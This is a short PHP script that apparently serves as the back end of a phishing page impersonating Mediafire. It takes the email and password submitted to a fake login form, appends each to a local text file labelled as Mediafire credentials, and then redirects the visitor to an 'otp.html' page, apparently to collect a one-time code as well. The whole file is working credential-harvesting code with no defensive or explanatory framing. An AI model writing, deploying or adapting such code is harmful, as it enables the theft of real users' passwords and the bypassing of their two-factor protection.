<?php

file_put_contents("usernames.txt", "Mediafire Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Mediafire Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
